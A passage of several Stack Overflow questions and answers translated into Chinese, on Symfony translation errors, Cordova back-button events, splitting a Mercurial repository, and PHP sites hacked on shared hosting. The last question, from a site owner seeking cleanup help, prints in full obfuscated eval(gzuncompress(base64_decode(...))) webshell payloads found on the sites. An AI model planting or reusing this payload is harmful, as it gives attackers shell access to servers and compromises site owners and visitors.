    klass = self.find_class(module, name)
  File "/Library/Frameworks/Python.framework/Versions/7.3/lib/python2.7/pickle.py", line 1124, in find_class
    __import__(module)
ImportError: No module named test_script 
```

# symfony - 类 Gedmo\Translatable\Entity\Translation 不是有效的实体或映射的超类

> ID：11866948
> 
> 赞同：0
> 
> 时间：2012-08-08T14:39:22.710
> 
> 标签：symfony, doctrine-orm

当我试图通过我的实体保留内容时，我收到以下错误：

> 类`Gedmo\Translatable\Entity\Translation`不是有效的实体或映射的超类。

我做了一些研究，但找不到任何可以解决这个问题的方法。

当我改变错误消失：

```
orm: 
    default: translatable: true 
```

到：

```
 orm: default: ~ 
```

在`config.yml`.

但内容不会保存为翻译，而是以“新”语言覆盖现有内容。

我的 deps 文件中有以下相关行：

```
[symfony]
    git=http://github.com/symfony/symfony.git
    version=origin/2.0

[gedmo-doctrine-extensions]
   git=http://github.com/l3pp4rd/DoctrineExtensions.git
   version=v2.3.0

[Stof-DoctrineExtensionsBundle]
   git=https://github.com/stof/StofDoctrineExtensionsBundle.git
   target=/bundles/Stof/DoctrineExtensionsBundle 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:52:11.097

我认为问题在于您正在请求扩展的 2.3.0 版本，但您的 symfony 版本是 2.0.x，它不包括最新的 Doctrine 版本。您应该将其更改为：

```
[gedmo-doctrine-extensions]
    git=http://github.com/l3pp4rd/DoctrineExtensions.git
    version=v2.1.0

[DoctrineExtensionsBundle]
    git=http://github.com/stof/StofDoctrineExtensionsBundle.git
    target=/bundles/Stof/DoctrineExtensionsBundle
    version=1.0.0 
```

# javascript - “后退按钮”事件不会触发

> ID：11866952
> 
> 赞同：5
> 
> 时间：2012-08-08T14:39:34.630
> 
> 标签：javascript, windows-phone-7, cordova, cordova-2.0.0

我正在尝试为 Windows Phone 7 构建 phonegap 应用程序。我正在尝试遵循“后退按钮”事件的文档 (http://docs.phonegap.com/en/2.0.0/cordova_events_events.md.html#backbutton )，但我似乎无法让它工作。

“deviceready”事件会触发，但“backbutton”事件不会。在 Visual Studio Windows Phone 模拟器中编译和运行时，会调用 onDeviceReady 函数并记录“设备就绪”，但是当按下模拟器后退按钮时，应用程序退出并且控制台中不会记录任何内容。按下后退按钮时，应运行 OnBackKeyDown 函数。

来自官方文档的代码副本：

```
<html>
    <head>     
        <script type="text/javascript" charset="utf-8" src="cordova-2.0.0.js"></script>
        <script type="text/javascript">
            function onLoad() {
                document.addEventListener("deviceready", onDeviceReady, false);
            }
            function onDeviceReady() {
                console.log("Device ready");
                document.addEventListener("backbutton", onBackKeyDown, false);
            }
            function onBackKeyDown() {
                console.log("Back button pressed");
            }
        </script>
    </head>
    <body onload="onLoad()">
        <div></div>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-13T11:54:42.687

我设法通过将cordova-1.8.1.js 的某些部分复制到cordova-2.0.0.js 来解决这个问题。

在 1.8.1 中，搜索：`var NamedArgs`并将整个对象复制到 2.0.0。

在 2.0.0 中，搜索：`var command = service + "/" + action + "/" + callbackId + "/" + JSON.stringify(args);`并将其替换为：

```
if ( action == 'overridebackbutton' ) {
    if ( NamedArgs[service] && NamedArgs[service][action]) {
        var argNames = NamedArgs[service][action];
        var newArgs = {};
        var len = Math.min(args.length,argNames.length);

        for(var n = 0; n < len; n++) {
            newArgs[argNames[n]] = args[n];
        }

        args = newArgs;
    }
    else if(args && args.length && args.length == 1) {
        args = args[0];
    }
}
var command = service + "/" + action + "/" + callbackId + "/" + JSON.stringify(args); 
```

这可能不是一个很好的解决方案，但它对我有用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-29T00:18:06.790

修复已在此处提交： [https ://github.com/purplecabbage/incubator-cordova-wp7/commit/d04b87abb3c3822ef25438e1353a1d7d2e0d6628](https://github.com/purplecabbage/incubator-cordova-wp7/commit/d04b87abb3c3822ef25438e1353a1d7d2e0d6628)

在此期间，您将需要等待 2.1.0 下周初发布，或者从源代码构建您的应用程序。

# mercurial - 我有一个包含多个项目的存储库，如何为存储库中的每个项目提供现有历史记录？

> ID：11866965
> 
> 赞同：3
> 
> 时间：2012-08-08T14:40:12.900
> 
> 标签：mercurial

大约一年前，当我开始使用 Mercurial 时，我创建了一个名为 SandBox 的存储库来存放我所有的项目，大约一年后，我意识到这不是一个非常明智的选择，我有 19 个项目，其中一些很大。我想为每个项目提供自己的存储库，同时保留历史记录。有没有一种简单的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T15:06:16.703

好吧，考虑一个具有以下结构的项目（[在 bitbucket 中](https://bitbucket.org/brandizzi/hgmultiproject)）：

```
$ find hgmultiproject
hgmultiproject
hgmultiproject/proj2
hgmultiproject/proj2/mysndfile
hgmultiproject/proj1
hgmultiproject/proj1/myfirstfile
hgmultiproject/proj3
hgmultiproject/proj3/mythirdfile 
```

这个项目有这个日志：

```
revision:    7:6bbc26c1a34d
tag:         tip
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:49:22 2012 -0300
summary:     correcting

revision:    6:32c312e7072e
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:48:55 2012 -0300
summary:     Adding period

revision:    5:f332e0ecee4d
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:48:39 2012 -0300
summary:     Moving to correct name

revision:    4:5850a93d80dd
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:48:05 2012 -0300
summary:     More content on second file

revision:    3:0098ebd2cea5
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:47:41 2012 -0300
summary:     A third file

revision:    2:096c984a8f2a
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:47:09 2012 -0300
summary:     More content on 1st file

revision:    1:b9491918efcc
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:46:52 2012 -0300
summary:     My second file

revision:    0:4e429ac2fee9
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:46:23 2012 -0300
summary:     My first file 
```

您可以使用带有[--filemap](http://mercurial.selenic.com/wiki/ConvertExtension#A--filemap)选项的[转换扩展](http://mercurial.selenic.com/wiki/ConvertExtension)来提取项目。

怎么做？首先，您应该创建一个文件映射文件。在这种情况下，内容应该是：

```
rename proj1 .
exclude proj2
exclude proj3 
```

第一行会将`proj1`目录中的所有内容移动到新存储库的根目录。第二行将`proj2`从新存储库中删除目录，第三行将删除`proj3`.

要使用它，只需这样调用：

```
$ hg convert --filemap proj1filemap hgmultiproject/ extracted-proj1 
```

现在，输入新的仓库：

```
$ cd extracted-proj1/ 
```

它没有工作副本...

```
extracted-proj1 $ ls 
```

y 但你只需要更新：

```
extracted-proj1 $ hg update
1 updated files, 0 merged files, 0 deleted files, 0 nonresolved files
extracted-proj1 $ ls
myfirstfile 
```

新的日志是...

```
extracted-proj1 $ hg log
revision:    2:eb31727c0df8
tag:         tip
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:48:55 2012 -0300
summary:     Adding period

revision:    1:e701f0ad5335
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:47:09 2012 -0300
summary:     More content on 1st file

revision:    0:c0b6ad18ff22
user:        Adam Victor Nazareth Brandizzi <brandizzi@gmail.com>
date:        Wed Aug 08 11:46:23 2012 -0300
summary:     My first file 
```

您应该为存储库的每个项目执行这些步骤。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:53:22.577

看看转换扩展：[https ://www.mercurial-scm.org/wiki/ConvertExtension](https://www.mercurial-scm.org/wiki/ConvertExtension)

你真正需要的是`--filemap`：[https ://www.mercurial-scm.org/wiki/ConvertExtension#A--filemap](https://www.mercurial-scm.org/wiki/ConvertExtension#A--filemap)

# php - 多个网站被黑，相同的 MO 但无法治愈

> ID：11866968
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:40:22.887
> 
> 标签：php

我们最近在破解网站方面遇到了一些麻烦。

我们在我们的网站（位于共享托管平台上）上发现了几个不属于那里的文件。这些文件通常是 .txt 或图像文件（曾经是 .js 文件），然后被包含在现有的 php 文件中，从而在服务器上有效地运行它们。

php代码是这样的：

```
<?php eval(gzuncompress(base64_decode('eF6VWNtu40YM/ZU... 
```

那么它真的只是从那里继续。

据我目前了解，上面的代码打开了某种外壳。

我们还有一些被感染的网站，它们在页面底部添加了指向各种色情/广告网站的链接。尽管我不认为将这些链接添加到页面的代码（与上面的代码片段相同）。我还没有找到这些改动的来源。

大多数这些攻击发生在 Drupal 站点上，其中一些升级到所有内容的最新版本（模块 + 核心）并且仍然显示出攻击迹象。攻击不仅限于 Drupal 站点，还有正常的 php 站点也被破解。

我知道第一步是检查服务器日志，我已经请求了它们，但我还没有。

我想知道是否有人可以给我一些关于我应该寻找什么或接下来要采取的“明显”步骤的指示。（我已经更改了 db 和 ftp 密码）。

我使用以下代码段来追踪一些文件：

```
grep -nRH --exclude=*.js 'eval(' * 
```

我还在不排除 javascript 文件的情况下运行了那段代码，并且我已经删除了我能找到的所有攻击者的文件。

我很乐意提供任何有助于解决此问题的其他信息。

**编辑：**文件的源代码：

```
 <?php eval(gzuncompress(base64_decode('eF6VWNtu40YM/ZU+LOBdoChsaV1AKPJgP6wMYZvCLqpbsQgsyYmbyK4QX+Wv7/BQF3dDjjcvI0XkcMhD8gydD/7XP6aTr3/+PXg4PAy+3U1eX5f1x2y5W/36+aFY5f8Wq4+DwU+/DNI4qDM3eMw34ck8h8uIvo63g08/f6edbkkSHhKXnosqc8b08pjG6yp3F5e3O0hsJPSoMz88yBrplmxCq8podcZkE3/ntIq2041HslMafb7TfJ2OitnvknRzvyN55t6X0l7jD5/b+ANEOE58R/y0SH7R942n+UXSbUBriTOiuehfuePc3FerzV9KBMZ72HkrXdL3eFIjRt87wNaJ1jvBVpMlaJsqcHR7xha9NfYkW4mpJpImcUmPx3wWXuhlObnD8dIOEgS12fHInoR7Id5o/CKfRvuQFXPScqLFeH1K7tO7dxLtkahGZkjTWVfpdq557qxrGc0MFRIIHstxLKPRyWD7Alznkv/FLKiyuYZhPgvKdOTVaTzdcVXRItU2IwVtRIodkVZH9t41VUrSHWo6BKaws/LLi9x3JC6AfrlHrLSI8XYdEI3oYVhppPjYsAexkelQUlpXXEcSayRuyBHR+sWrsk05tGh98S6dn7C9ODKCak0g82FjH5hceLfZOZN6nZkmxFlpDLw1zd4rel6uvULEM8CpetbHxDjxWbxT20Wfk967o67Z2qelQddUQvgsarb4P0PbN7b12r55f5g+3GeOiBiYm6RARuM+7gdUZBIvnnWuYoSNNj3+twMbNPu0GH7NmT2Fqsz5RgF2he/tgI5blPmTZDPv+3ff+GuNjN5uaV/xQhsVPRTtgnlyl1J+KYPAdyF0Z+MFPWCbmVX1gj04A4cIPg9lPqT7KmaWLZnPz+vEkW5KsklynG5OpvcmX1qW3WndTEHDVMzAEnchcD3I9yDnPPznOv+xc38s6D0aC5wDTedcpvFEiRd21BpCTTrowSFiNF3FXBuMk2jxotSSvS6v7hVURaTeKcjFlJYa0wLj13mj4IhqwFxhmSk4HyYXpPKEpIk5IcmPzChtbn4sLy079B0BD3ix9jtXiMRaOaSipPXJNXWNfFNd04tU2/Q9A9Lz0VtpFklfESlPQ3zDmh7mKVfr36LRNrPLcyZqdXwQIeOaFk4OwBpGg/6SbdlPskn5fHNTBVUCXM7K/NznSP1V4pyPyZM6tap3jvFhZ6r1Vbaq7wPSXIWW/blrZitfmpDflSVmbTXrJgbCkOQGR9AxZioZS3h+hTziRCS2DLzx5obP9OiqS60dxgD5YxwsVXZbC31KMh+8qlSKpZvRueEwcbzj0iklP3xcTnvL/EPfmxlIZ2pzAklG2VatrbY+mJWAJHCnRb2/DYfArowNMxQtnuCTzD8NYogns+Pazw3t7xQpR+1M1vyiQVa730Hyjm4iqO2adrZhVIOO9YCmqNlwtIok0Ldk97tqfbenehY5G9354mza9YCSJ0j1XNPS1i/saFHK9dJMKLL+bUSV/0rpPnf/CYGvtLwflfb8rO81eQoAKrjrfbAs/unV3Pe0qJMvV3A/IdyYfG394xh+IjXiKDwlniIBbie/vOKqT7/9BzrVvS4='))); ?><?php eval(gzuncompress(base64_decode('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